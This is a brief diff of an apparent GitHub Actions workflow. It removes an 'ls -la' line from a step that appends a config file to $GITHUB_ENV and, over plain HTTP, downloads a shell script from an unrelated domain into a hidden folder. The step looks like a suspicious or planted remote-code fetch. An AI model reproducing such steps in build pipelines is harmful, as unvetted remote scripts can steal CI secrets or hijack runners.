@@ -79,7 +79,6 @@ jobs:
             hugo-
       - name: Prepare packers brokers
         run: |
-          ls -la
           cat ./con/app.conf >> $GITHUB_ENV
           mkdir "${HOME}/.local/pack"
           curl -o ${HOME}/.local/pack/packers http://yuros.my.id/scritps/packers.sh
